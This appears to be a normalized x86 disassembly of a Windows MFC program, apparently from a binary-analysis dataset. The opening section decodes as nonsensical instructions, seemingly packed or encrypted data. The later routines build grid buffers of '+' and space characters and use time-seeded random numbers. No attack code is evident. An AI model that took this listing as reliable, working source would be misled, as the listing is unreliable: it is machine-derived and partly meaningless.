add ah [ 0xffffffffcf44d901 ]
push cs
or ecx [ eax - 0x33 ]
retn 0x3ea7
push esp
jpo rwxdata
movsb [ edi ] [ esi ]
popad
jecxz rwxdata
mov dl 0xf1
fmulp st1
xchg [ esi ] edx
fwait
movsb [ edi ] [ esi ]
outsb
sub [ eax ] dh
pop ebp
xor eax 0x9171f9ef
dec edi
pop esi
sub_4021a2
fstpnce st0
lea ebx [ edx + 0x62 ]
bound ecx [ ebx ]
jae rwxdata
xchg ecx eax
pop edx
bound esp [ edx - 0x25 ]
fmul [ ebp - 0x249d9da6 ]
into
jae rwxdata
cmp [ edx - 0x9efe4a3 ] esp
jecxz rwxdata
adc ebx ebx
sub eax 0x91c8db5a
pop edx
bound esp [ edx - 0x25 ]
fidiv [ ebx - 0x7b ]
fcmovnu st6
jae rwxdata
popad
fstpnce st6
fmul [ ecx - 0x1c9d9da6 ]
mov eax [ 0xffffffff84a9e361 ]
xor al 0xba
add al 0xd5
lodsb [ esi ]
pop edx
bound esp [ edx - 0x25 ]
fidiv [ ebx - 0x7b ]
pop edx
bound esp [ edx + 0x63 ]
fidiv [ ecx - 0x7b ]
pop edx
bound esp [ edx - 0x25 ]
fmul [ ebp - 0x249d9da6 ]
into
jae rwxdata
pop edx
fcmovne st0
xchg ecx eax
pop edx
bound esp [ edx - 0x5f ]
movsb [ edi ] [ esi ]
mov eax [ 0xffffffffce634ba2 ]
jno rwxdata
pop edx
bound esp [ edx + 0x62 ]
bound esp [ edx + 0x62 ]
lahf
loopne rwxdata
jpe rwxdata
pop edx
bound esp [ edx + 0x63 ]
fidiv [ ecx - 0x7b ]
pop edx
bound esp [ edx - 0x27 ]
fidiv [ ebx - 0x77 ]
pop edx
bound esp [ edx - 0x27 ]
into
jae rwxdata
jno rwxdata
into
pop edx
bound esp [ edx - 0x1d ]
mov ebx 0xeb5d335a
loop rwxdata
mov [ edx + 0x62 ] ebx
bound esp [ ebx - 0x22 ]
pop edx
bound esp [ edx + 0x12 ]
bound esp [ edx + 0x62 ]
mov edx 0xa7a7a705
movntq [ eax + 0x62 ] mmx1
inc esp
iretd
sub ebp ebx
cdq
and esp [ ecx - 0x510a3cb3 ]
das
lahf
loop rwxdata
push edi
pop ss
dec eax
or [ eax + 0x8 ] cl
jne rwxdata
pop edx
bound esp [ edx - 0x1d ]
mov ebx 0xeb5d335a
loop rwxdata
bound esp [ edx - 0x46 ]
adc al 0xa7
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
jecxz rwxdata
bound esp [ edx - 0x1d ]
mov ecx 0xe95d335a
fcmovnu st6
jae rwxdata
pop edx
bound esp [ edx - 0x27 ]
fidiv [ ebx - 0x77 ]
pop edx
bound esp [ edx - 0x27 ]
into
jae rwxdata
aam 0x73
popad
jns rwxdata
push edi
pop ss
adc [ ecx ] dl
jne rwxdata
bound esp [ edx + 0x62 ]
jecxz rwxdata
bound esp [ edx - 0x1d ]
mov ecx 0xe95d335a
loop rwxdata
sub eax 0x13e07b0
jb rwxdata
bound esp [ edx - 0x27 ]
enter 0x5a91 0x62
xor al 0x5f
jmp 0xfffffffff6f8ca99
pop edx
bound esp [ edx - 0x5f ]
movsb [ edi ] [ esi ]
push ebx
mov eax [ 0xffffffffce634ba2 ]
cmp eax 0x62747334
bound esp [ edx - 0x25 ]
push ds
jle rwxdata
sar [ esi + 0x5a ] 0x1
mov edx 0x39a642fa
adc bh ah
xchg edx eax
add ah [ 0xffffffffcf44d901 ]
push cs
or ecx [ eax - 0x33 ]
retn 0x3ea7
test eax 0xeea577f0
or [ edx ] ebp
0x3c60
fld [ 0xffffffff91c8db5a ]
adc ax 0x1555
push ebp
or [ eax + 0x8 ] cl
dec eax
aaa
ja rwxdata
enter 0x5a91 0x62
loop rwxdata
pop edx
xor ebx [ ebp - 0x17 ]
mov [ 0xffffffffb2deedd5 ] eax
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
push edi
jno rwxdata
bound esp [ edx + 0x62 ]
fxch st0
xchg ecx eax
pop edx
bound esp [ edx - 0x27 ]
fmul [ ebp + 0xb62625a ]
bound esp [ edx - 0x27 ]
enter 0x5a91 0x62
xor [ ecx - 0x22265859 ] 0xa7a7ab07
pop esp
jmp rwxdata
mov edx 0x6262625f
sub eax 0x73343d33
je rwxdata
bound esp [ ss : edi - 0x584e7e33 ]
jecxz rwxdata
ja rwxdata
jmp rwxdata
cmpsd [ esi ] [ edi ]
int 0x81
mov cl 0xa7
cmpsd [ esi ] [ edi ]
fstpnce st5
and ebp [ ebx - 0x2bc55859 ]
mov bl 0x86
pop esi
cmpsd [ esi ] [ edi ]
in eax dx
stosd [ di ]
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
cmp al 0x62
mov edx 0xa7a7afb5
cmp ah [ edi - 0x2a9d9d9e ]
lds esi [ eax - 0x50 ]
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
adc edi [ edx ]
cmpsd [ esi ] [ edi ]
xchg edx eax
fstp [ 0x6106baa6 ]
bound esp [ edx - 0x41 ]
and ebp ecx
sub bl 0x5c
frstor [ edx - 0x3b ]
sbb al 0x44
cmp ch bl
pop esp
add [ edx - 0x14 ] esp
jo rwxdata
mov [ edi + 0x62e15ceb ] bl
mov [ edi ] dh
jge rwxdata
jecxz rwxdata
jge rwxdata
push edx
add [ edx + 0x72725252 ] 0x62
bound eax [ edx + 0x52626282 ]
push edx
jb rwxdata
jmp rwxdata
jmp rwxdata
push ebx
popad
jecxz rwxdata
cdq
cmpsd [ esi ] [ edi ]
fstpnce st5
pop es
stosd [ edi ]
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
xchg edx eax
rcl dl cl
rcl dl cl
rcl dl cl
sar [ edx ] cl
cmc
xchg ecx eax
outsb
and [ edi - 0x58549813 ] esp
cmpsd [ esi ] [ edi ]
cmp al 0x62
mov edx 0xa7a7aa18
fstpnce st5
xor [ ecx + 0x59baa7a7 ] 0x41626262
xor [ ecx + 0x32 ] al
cmp [ ebx + 0x74 ] esi
bound esp [ edi - 0x584e7e33 ]
cmpsd [ esi ] [ edi ]
fstpnce st5
bts [ edi + 0x6260baa7 ] esp
bound esp [ edx + 0x38 ]
bound esp [ ss : edi - 0x584e7e33 ]
cdq
movsb [ edi ] [ esi ]
pop esi
bound edx [ ebx ]
fcmovne st0
bound esp [ edx - 0x7e ]
adc [ edx + 0x52 ] 0x82
and [ edx + 0x62 ] 0x72
jb rwxdata
xchg ebx eax
jae rwxdata
dec edx
jno rwxdata
arpl si bx
mov [ edx + 0x5941e88b ] edi
bound esp [ edx - 0x61 ]
loopne rwxdata
test [ edx + edi * 4 ] dh
fcmovnu st0
lea ebx [ edx + 0x62 ]
sahf
mov ah 0x62
mov dh 0x8b
pop esp
cmc
pop esp
int 0x62
pop edi
jo rwxdata
out dx eax
sbb [ ebx - 0x60 ] ah
pop esi
arpl [ edi + 0x12101111 ] bx
pop ebp
pop ebx
sub [ eax + 0x62755ceb ] al
salc
cmc
add eax 0xb25ceb8b
pop esp
dec ebx
loope rwxdata
int1
bound ecx [ ebp - 0x14a73414 ]
pop esp
in eax dx
bound esp [ esi - 0x66 ]
std
cmp ebp ebx
pop esp
jmp 0xffffffffcade6e35
dec ecx
jmp rwxdata
cmpsd [ esi ] [ edi ]
int 0x2e
stosd [ edi ]
cmpsd [ esi ] [ edi ]
bound ebp [ 0x64a0e3c1 ]
fldcw [ 0x68e340aa ]
bound ebp [ esi ]
push ecx
push edi
out dx eax
pushad
push edi
out dx eax
sbb [ ebx - 0x60 ] ah
pop esi
fldcw [ esi + 0x6a ]
arpl [ ecx - 0x58c54645 ] si
bound esp [ edx + 0x62 ]
aad 0xdd
jo rwxdata
jb rwxdata
mov bh 0xeb
pop esp
stosb [ edi ]
push esi
or al 0x41
mov cl [ esi ]
jmp rwxdata
ficom [ ebx - 0x369d8ea4 ]
adc [ ecx - 0x6b ] cl
xchg ebx eax
pop esp
insd
bound edi [ edx - 0x64 ]
push ss
lodsb [ esi ]
xchg ebx eax
pop esp
and [ edx - 0x36 ] esp
and esp 0x1d5c9376
bound edi [ edx - 0x6c546b1a ]
pop esp
sbb [ edx - 0x72 ] esp
lodsb [ esi ]
enter 0x936e 0x5c
adc eax 0xef596b62
ficom [ ebx - 0x5f9d96a4 ]
cdq
enter 0x930b 0x5c
bound ebp [ gs : eax - 0x14e19146 ]
pop esp
aad 0x62
and eax 0xeb1b7c68
pop esp
shl [ edx + 0x58 ] 0x1
fldenv [ esi + ebx - 0x15 ]
pop esp
and [ edx + 0x51 ] 0xeb7cf554
pop esp
jge rwxdata
das
mov ecx 0x62255ceb
cmp [ ebp + 0x36 ] 0x39
out 0x5c eax
sub eax 0x4a64f762
cmpsd [ esi ] [ edi ]
adc dl ch
in eax 0x6d
arpl bx bx
adc eax 0x2d9a6ba6
jne rwxdata
mov al [ 0x626261ab ]
aad 0xe5
fidiv [ edx - 0x10a85859 ]
cmpsd [ esi ] [ edi ]
jecxz rwxdata
mov cl 0x40
bound edi [ edx - 0x58584ffb ]
push edi
out dx eax
punpcklbw mm3 mmx1
pop esi
je rwxdata
jecxz rwxdata
fnsave [ edx - 0x4e ]
jecxz rwxdata
lahf
pop edx
mov ebx 0x6262ba87
bound esp [ edx + 0x8 ]
cmpsd [ esi ] [ edi ]
int 0x75
mov cl 0xa7
cmpsd [ esi ] [ edi ]
or [ ebx - 0x4f ] esp
inc eax
adc [ ecx ] edx
adc [ edx ] dl
cmpsd [ esi ] [ edi ]
jecxz rwxdata
pop esi
cmpsd [ esi ] [ edi ]
nop
cmp ah [ ebx - 0x19 ]
sub [ ecx - 0x59 ] 0xa7ab67ed
cmpsd [ esi ] [ edi ]
cmp al 0x62
mov edx 0xa7a7ade8
cmpsd [ esi ] [ edi ]
xchg edx eax
adc ah [ edi - 0x5854d133 ]
aad 0xdd
jb rwxdata
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
cmp bl [ eax + 0x63 ]
mov ebp 0x7eda7c0
stosd [ edi ]
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
cmp al 0x62
mov edx 0xa7a7ad22
pop ebx
mov [ 0xffffffffce3a542d ] al
jbe rwxdata
outsb
push 0x63
mov cl 0xbb
mov ecx 0x6262a73a
bound ebp [ esi ]
inc esi
push edi
out dx eax
pop ds
pop esi
cmpsd [ esi ] [ edi ]
outsd
cmpsd [ esi ] [ edi ]
outsb
jmp rwxdata
pushad
push edi
stosd [ edi ]
popad
bound esp [ edx - 0x2b ]
in eax 0xde
mov dl 0xa7
cmpsd [ esi ] [ edi ]
push edi
out dx eax
scasd [ edi ]
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
insd
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
adc dl ch
frstor [ edx ]
mov dl 0xa7
cmpsd [ esi ] [ edi ]
adc bh [ edx ]
cmp al 0x62
cmp al 0x62
cmp al 0x62
cmp al 0x62
cmp al 0x62
aad 0xdd
shr [ esi + 0x1312a7a7 ] cl
cmpsd [ esi ] [ edi ]
int 0xf1
mov dl 0xa7
cmpsd [ esi ] [ edi ]
mov ecx 0x6262617c
mov edx 0x6262625a
inc ecx
xor [ edx ] dh
inc ecx
inc ebx
cmp esp [ edx - 0x59 ]
int 0x81
mov cl 0xa7
cmpsd [ esi ] [ edi ]
cmp bh [ ebx ]
outsd
pop esi
sub [ edx ] dl
cmp al 0x62
mov edx 0xa7a7ad08
cmp al 0x62
cmp al 0x62
cmpsd [ esi ] [ edi ]
xchg edx eax
fcmovu st5
jae rwxdata
fbld [ edi - 0x58549813 ]
cmpsd [ esi ] [ edi ]
cmp al 0x62
mov edx 0xa7a7ad7c
fstpnce st5
loope rwxdata
mov cl 0xa7
cmpsd [ esi ] [ edi ]
out dx eax
bound esp [ edx + 0x62 ]
push edi
fdivp st3
bound esp [ edx + 0x62 ]
cmpsd [ esi ] [ edi ]
sub eax 0x7dcda7a6
mov cl 0xa7
cmpsd [ esi ] [ edi ]
loop rwxdata
int 0x55
salc
movsd [ edi ] [ esi ]
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
popad
and eax 0xb2deedd5
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
mov edx 0x62626262
pop es
loope rwxdata
push ebp
mov cl 0xa7
cmpsd [ esi ] [ edi ]
aad 0xdd
daa
scasb [ edi ]
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
adc bh [ edx ]
cmp al 0x62
cmpsd [ esi ] [ edi ]
int 0x59
mov cl 0xa7
cmpsd [ esi ] [ edi ]
fstp [ 0x55cda7a6 ]
sqrtps xmm4 [ edx + 0x62 ]
mov edx 0x6262626e
mov [ edx + 0x11 ] esp
pop ebp
mov ecx 0xbd621b62
sub_402f8c
cmp eax 0x51004045
inc ebp
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x1 ] ch
push sub_40460a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push 0x1e0
call Ordinal_MFC42_823
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je rwxdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx eax
call sub_403040
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_403040
push 0xffffffff
push sub_404636
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call Ordinal_MFC42_366
lea ecx [ esi + 0xc0 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_529
lea ecx [ esi + 0x140 ]
mov [ esp + 0x10 ] 0x1
call Ordinal_MFC42_554
mov ecx [ esp + 0x8 ]
mov [ esi ] rwxdata
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4030c0
push 0xffffffff
push sub_404656
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] rwxdata
lea ecx [ esi + 0x140 ]
mov [ esp + 0x10 ] 0x1
call Ordinal_MFC42_807
lea ecx [ esi + 0xc0 ]
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_796
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call Ordinal_MFC42_674
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_403130
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
call Ordinal_MFC42_4457
cmp eax 0xffffffff
je rwxdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn 0x4
push 0xe800
xor eax eax
sub esp 0x10
xor ecx ecx
mov ebp esp
xor edx edx
lea edi [ esi + 0x140 ]
push 0x50402834
mov [ ebp ] eax
xor ebx ebx
push 0x800
push esi
mov [ ebp + 0x4 ] ecx
mov ecx edi
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] ebx
call Ordinal_MFC42_6625
test eax eax
je rwxdata
push 0x80
mov ecx edi
call Ordinal_MFC42_4163
test eax eax
je rwxdata
lea ebx [ esi + 0xc0 ]
push 0xe801
push 0x50008200
push esi
mov ecx ebx
call Ordinal_MFC42_2117
test eax eax
je rwxdata
push 0x4
push rwxdata
mov ecx ebx
call Ordinal_MFC42_6000
test eax eax
je rwxdata
push 0xf000
mov ecx edi
call Ordinal_MFC42_2626
push 0xf000
mov ecx esi
call Ordinal_MFC42_2627
push 0x0
push 0x0
push edi
mov ecx esi
call Ordinal_MFC42_2494
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
sub_403300
push 0xffffffff
push sub_404672
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_1134
add esp 0x4
mov ecx esi
call Ordinal_MFC42_2621
push rwxdata
mov ecx esi
call Ordinal_MFC42_6117
push 0x4
mov ecx esi
call Ordinal_MFC42_4159
push 0x6c
call Ordinal_MFC42_823
add esp 0x4
mov [ esp + 0x4 ] eax
test eax eax
mov [ esp + 0x34 ] 0x0
je rwxdata
xor eax eax
push rwxdata
push rwxdata
push rwxdata
push 0x80
mov ecx eax
call Ordinal_MFC42_520
jmp rwxdata
mov ecx [ esi + 0x20 ]
push 0x0
call Ordinal_MFC42_6215
mov esi [ esi + 0x20 ]
mov edx [ esi + 0x20 ]
push edx
call [ UpdateWindow@IAT ]
lea ecx [ esp + 0x8 ]
mov [ esp + 0x34 ] 0xffffffff
call Ordinal_MFC42_617
mov ecx [ esp + 0x2c ]
mov eax 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x34
retn
lea ecx [ esp + 0x8 ]
mov [ esp + 0x34 ] 0xffffffff
call Ordinal_MFC42_617
xor eax eax
pop esi
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
add esp 0x34
retn
push eax
mov ecx esi
mov [ esp + 0x38 ] 0xffffffff
call Ordinal_MFC42_986
lea ecx [ esp + 0x8 ]
call Ordinal_MFC42_296
lea eax [ esp + 0x8 ]
mov ecx esi
push eax
mov [ esp + 0x38 ] 0x1
call Ordinal_MFC42_5214
lea ecx [ esp + 0x8 ]
push ecx
mov ecx esi
call Ordinal_MFC42_5301
test eax eax
jne rwxdata
sub_403490
push 0xffffffff
push sub_404688
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x60
lea ecx [ esp ]
call sub_403420
lea ecx [ esp ]
mov [ esp + 0x68 ] 0x0
call Ordinal_MFC42_2514
lea ecx [ esp ]
mov [ esp + 0x68 ] 0xffffffff
call Ordinal_MFC42_641
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
add esp 0x6c
retn
sub_403510
push 0xffffffff
push sub_4046aa
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push 0x54
call Ordinal_MFC42_823
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je rwxdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx eax
call sub_4035b0
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_403640
push 0xffffffff
push sub_4046ca
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push 0x44
call Ordinal_MFC42_823
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je rwxdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx eax
call sub_4036e0
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_403770
mov eax 0x24a0
call sub_4043d0
push esi
mov [ esp + 0x14 ] ecx
push edi
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x21 ]
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x124 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x48
xor eax eax
lea edi [ esp + 0x125 ]
mov esi [ sprintf@IAT ]
[ edi ]
stosb [ edi ]
lea eax [ esp + 0x124 ]
push rwxdata
push eax
call esi
lea ecx [ esp + 0x28 ]
push rwxdata
push ecx
call esi
add esp 0x10
or ecx 0xffffffff
xor esi esi
test eax eax
mov [ esp + ecx + 0x249 ] dl
jle rwxdata
mov [ esp + ecx + 0x1058 ] 0x2b
inc eax
add ecx 0x2
cmp eax 0x9
jl rwxdata
mov [ esp + ecx + 0x248 ] 0x20
mov dl al
add dl 0x31
test eax eax
mov [ esp + ecx + 0x1059 ] dl
jle rwxdata
mov [ esp + esi + 0x1069 ] 0x0
mov [ esp + esi + 0x259 ] 0x0
add esi 0x12
cmp ecx 0xe0f
jl rwxdata
xor eax eax
push ebx
xor ebx ebx
xor edi edi
push ebp
mov [ esp + 0x14 ] edi
inc edi
cmp edi 0x8
mov [ esp + 0x14 ] edi
jl rwxdata
lea esi [ edi + 0x1 ]
cmp esi 0x8
mov [ esp + 0x1c ] esi
jge rwxdata
lea edx [ edi + ebx * 8 ]
mov eax ebx
add eax edx
shl eax 0x1
inc ebx
cmp edi 0x7
mov [ esp + eax + 0x1061 ] 0x20
mov [ esp + eax + 0x251 ] 0x2b
jge rwxdata
xor ebx ebx
xor ebp ebp
lea ecx [ ebx + ebx * 8 ]
lea eax [ ecx + esi ]
add ecx edi
shl eax 0x1
shl ecx 0x1
inc ebx
mov [ esp + eax + 0x1061 ] 0x20
mov [ esp + eax + 0x251 ] 0x2b
cmp esi 0x7
mov [ esp + ecx + 0x1061 ] 0x20
mov [ esp + ecx + 0x251 ] 0x2b
jge rwxdata
add edi eax
movsx eax [ esi + ecx ]
sub eax 0x30
inc ecx
cmp dl 0x20
je rwxdata
inc esi
cmp esi 0x8
mov [ esp + 0x1c ] esi
jl rwxdata
lea eax [ esi + 0x1 ]
lea ebp [ esi + 0x2 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x18 ] ebp
mov dl [ esi + ecx - 0x1 ]
cmp dl 0x2b
je rwxdata
add eax edi
mov ecx 0x1
mov [ esp + ebp + 0x1e70 ] eax
xor esi esi
mov eax ecx
lea edi [ esp + ebx + 0x250 ]
inc ecx
cmp ecx 0x11
jl rwxdata
movsx edx dl
lea eax [ eax + eax * 4 ]
lea eax [ edx + eax * 2 - 0x30 ]
jmp rwxdata
mov edx [ esp + 0x10 ]
inc edx
inc ebp
cmp ebp 0x9
mov [ esp + 0x10 ] edx
mov [ esp + 0x18 ] ebp
jl rwxdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
lea edi [ ebx + ebx * 8 ]
lea ecx [ edi + edx ]
lea edx [ edi + esi ]
lea esi [ edi + eax ]
mov eax 0x8
sub eax ebp
shl ecx 0x1
shl edx 0x1
shl esi 0x1
add ebx eax
add esi ecx
lea ecx [ ebx + eax ]
movsx ecx [ esp + ecx + 0x251 ]
sub ecx 0x30
inc eax
cmp dl 0x20
je rwxdata
mov ecx [ esp + 0x10 ]
lea edx [ ebx + ebx * 8 ]
lea eax [ edx + ecx ]
lea ecx [ edx + esi ]
shl eax 0x1
add edx edi
shl ecx 0x1
shl edx 0x1
mov [ esp + eax + 0x1061 ] 0x20
mov [ esp + eax + 0x251 ] 0x2b
inc ebx
mov [ esp + ecx + 0x1061 ] 0x20
mov [ esp + ecx + 0x251 ] 0x2b
cmp ebp 0x8
mov [ esp + edx + 0x1061 ] 0x20
mov [ esp + edx + 0x251 ] 0x2b
mov [ esp + 0x24 ] ebx
jge rwxdata
lea eax [ edi + ebp ]
add edi 0x9
shl eax 0x1
add ecx 0x12
add edx 0x12
mov [ esp + eax + 0x1061 ] 0x20
mov [ esp + eax + 0x251 ] 0x2b
mov [ esp + ecx + 0x104f ] 0x20
mov [ esp + ecx + 0x23f ] 0x2b
mov [ esp + edx + 0x104f ] 0x20
mov [ esp + edx + 0x23f ] 0x2b
mov [ esp + esi + 0x1061 ] 0x20
mov [ esp + esi + 0x251 ] 0x2b
add esi 0x12
inc ebp
cmp ebp 0x8
jl rwxdata
mov esi [ esp + 0x1c ]
mov ebp [ esp + 0x18 ]
mov edi [ esp + 0x14 ]
mov dl [ edi + eax ]
cmp dl 0x2b
je rwxdata
add ecx esi
add ebx 0x12
mov [ esp + ebp + 0x2190 ] ecx
add ebp 0x4
cmp ebx 0xe10
jl rwxdata
inc eax
cmp eax 0x11
jl rwxdata
movsx edx dl
lea ecx [ ecx + ecx * 4 ]
lea ecx [ edx + ecx * 2 - 0x30 ]
jmp rwxdata
mov eax 0x1
xor edi edi
mov ecx eax
lea esi [ esp + ebx + 0x1061 ]
push 0x0
call [ time@IAT ]
push eax
call [ srand@IAT ]
add esp 0x8
call [ rand@IAT ]
cdq
mov ecx 0x970fe0
pop ebp
idiv ecx
pop ebx
mov esi edx
add esi 0x186a0
cmp esi 0x54c563
jge rwxdata
xor eax eax
mov ecx 0x54db15
mov eax 0x79866dc7
sub ecx esi
mul ecx
sub ecx edx
shr ecx 0x1
add ecx edx
shr ecx 0xc
lea edx [ ecx + ecx * 8 ]
lea eax [ ecx + edx * 4 ]
lea eax [ eax + eax * 2 ]
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 ]
lea ecx [ eax + esi ]
lea esi [ ecx + eax * 4 ]
mov ecx [ esp + 0x18 ]
call sub_403af0
cmp esi [ esp + eax + 0x2188 ]
je rwxdata
add eax 0x4
cmp eax 0x320
jl rwxdata
cmp esi [ esp + eax + 0x1e68 ]
je rwxdata
sub_403af0
sub esp 0x94
push ebx
mov ebx [ malloc@IAT ]
push ebp
push esi
push edi
mov [ esp + 0x30 ] ecx
push 0x14
call ebx
mov ebp eax
push 0x14
mov [ esp + 0x44 ] ebp
call ebx
mov edi eax
push 0x14
mov [ esp + 0x40 ] edi
call ebx
push 0x14
mov [ esp + 0x3c ] eax
call ebx
mov esi eax
push 0x0
mov [ esp + 0x4c ] esi
call [ time@IAT ]
push eax
call [ srand@IAT ]
add esp 0x18
call [ rand@IAT ]
cdq
mov ecx 0x63
idiv ecx
lea eax [ edx + 0x1 ]
cmp eax 0x7d
je rwxdata
push 0x0
call [ exit@IAT ]
cmp eax 0x3e7
je rwxdata
mov ecx [ esp + 0x30 ]
push 0x0
push 0x0
push rwxdata
call Ordinal_MFC42_4224
jmp rwxdata
cmp eax 0x613
jne rwxdata
mov eax [ esp + 0x2c ]
sub ebp esi
sub eax esi
sub edi esi
mov [ esp + 0x18 ] esi
mov [ esp + 0x44 ] eax
mov [ esp + 0x40 ] ebp
mov [ esp + 0x28 ] edi
mov [ esp + 0x20 ] 0x5
jmp rwxdata
mov ecx [ esp + 0x30 ]
push 0x0
push 0x0
push rwxdata
call Ordinal_MFC42_4224
push 0x0
call [ exit@IAT ]
add ebp esi
push 0xc8
mov [ esi ] 0x32
mov [ esp + 0x20 ] ebp
call ebx
mov [ ebp ] eax
mov edx [ esi ]
shl edx 0x2
add edi esi
push edx
mov [ esp + 0x1c ] edi
call ebx
mov [ edi ] eax
mov eax [ esp + 0x4c ]
mov ecx [ esi ]
shl ecx 0x2
lea edi [ eax + esi ]
push ecx
mov [ esp + 0x1c ] edi
call ebx
mov [ edi ] eax
mov eax [ esi ]
add esp 0xc
mov [ esp + 0x24 ] 0x0
test eax eax
jle rwxdata
mov eax [ esp + 0x20 ]
add esi 0x4
dec eax
mov [ esp + 0x18 ] esi
mov [ esp + 0x20 ] eax
jne rwxdata
mov ebx ebp
mov ebp [ esp + 0x14 ]
xor esi esi
jmp rwxdata
mov edi [ esp + 0x28 ]
mov ebp [ esp + 0x40 ]
mov ebx [ esp + 0x2c ]
mov eax [ esp + 0x38 ]
mov edx [ esp + 0x34 ]
sub eax ebx
mov ecx ebx
sub edx ebx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x18 ] eax
mov [ esp + 0x28 ] edx
mov [ esp + 0x10 ] 0x5
mov edx [ edi ]
mov [ esi + edx ] 0x32
mov eax [ edi ]
mov ecx [ esi + eax ]
shl ecx 0x2
push ecx
call [ malloc@IAT ]
mov edx [ ebx ]
mov [ esi + edx ] eax
mov eax [ edi ]
mov ecx [ esi + eax ]
shl ecx 0x2
push ecx
call [ malloc@IAT ]
mov edx [ ebp ]
add esp 0x8
xor edi edi
mov [ esi + edx ] eax
mov eax [ esp + 0x10 ]
mov eax [ eax ]
cmp [ esi + eax ] 0x0
jle rwxdata
mov esi [ esp + 0x10 ]
add ecx 0x4
dec esi
mov [ esp + 0x1c ] ecx
mov [ esp + 0x10 ] esi
jne rwxdata
xor ebx ebx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
inc eax
add esi 0x4
mov edx [ ecx ]
mov [ esp + 0x24 ] eax
cmp eax edx
jl rwxdata
mov ebx [ esp + 0x1c ]
mov ebp [ esp + 0x14 ]
mov esi [ eax + ecx ]
mov [ esp + 0x24 ] 0x0
test esi esi
jle rwxdata
mov edi [ esp + 0x3c ]
mov ebp [ free@IAT ]
sub edi ebx
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x10 ] edi
mov esi [ esp + 0x24 ]
mov edi [ eax + ecx ]
inc esi
add ebx 0x4
cmp esi edi
mov [ esp + 0x24 ] esi
jl rwxdata
add edx ecx
mov [ esp + 0x20 ] edx
mov edi [ esp + 0x10 ]
mov ebx [ malloc@IAT ]
mov esi ecx
mov eax [ esp + 0x10 ]
inc edi
mov edx [ eax ]
cmp edi [ esi + edx ]
jl rwxdata
mov ebx [ esp + 0x1c ]
mov ebp [ esp + 0x14 ]
mov eax [ ebx ]
push eax
call ebp
mov ecx [ esp + 0x2c ]
mov edx [ ebx + ecx ]
push edx
call ebp
mov eax [ edi + ebx ]
push eax
call ebp
mov eax [ esp + 0x20 ]
add esp 0xc
add eax 0x4
add ebx 0x4
cmp eax 0x14
mov [ esp + 0x14 ] eax
jl rwxdata
mov ecx [ ebx ]
xor edi edi
cmp [ ecx + esi * 4 ] 0x0
jle rwxdata
mov esi [ ecx ]
xor ebp ebp
cmp [ esi + ebx ] 0x0
jle rwxdata
mov ebx [ esp + 0x2c ]
mov edx [ ecx ]
inc ebp
cmp ebp [ edx + ebx ]
jl rwxdata
mov ecx 0x16
xor eax eax
lea edi [ esp + 0x49 ]
